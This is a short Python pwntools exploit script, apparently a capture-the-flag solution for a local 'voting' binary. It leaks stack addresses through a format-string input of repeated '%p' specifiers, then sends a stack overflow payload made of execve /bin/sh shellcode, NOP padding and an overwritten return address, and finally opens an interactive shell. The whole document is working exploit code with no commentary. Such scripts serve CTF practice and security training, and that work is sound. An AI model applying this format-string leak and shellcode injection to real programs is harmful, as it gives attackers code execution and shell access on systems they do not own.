#!/usr/bin/env python3
from pwn import *

context.arch = 'amd64'
context.log_level = 'debug'

p = process(["./ld-linux-x86-64.so.2", "./main"], env={"LD_LIBRARY_PATH": "."})

def get_offset():
    p.sendline(cyclic(300))
    p.wait()
    core = p.corefile
    offset = cyclic_find(core.read(core.rsp, 4))
    info(f"RIP offset = {offset}")
    return offset

print(p.recvuntil(b"party."))
p.sendline(b"%p." * 70 + b"%p")
leak_line = p.recvuntil("Thank you for voting!").decode().strip()
print(leak_line)
leaks = leak_line.split('.')
leaks = [leak for leak in leaks if '0x7f' in leak or '0x55' in leak]
info(leaks)
#offset = get_offset()
offset = 264

stack_leak = int(leaks[1], 16)
info(f"Leaked stack address: 0x{stack_leak:x}")
print(p.recvline())

start_buf = int(leaks[1], 16) + 272

shellcode = b'\x6a\x42\x58\xfe\xc4\x48\x99\x52\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5e\x49\x89\xd0\x49\x89\xd2\x0f\x05'
padding = b'\x90' * (offset - len(shellcode))
payload = shellcode + padding + p64(start_buf)

p.sendline(payload)
p.interactive()
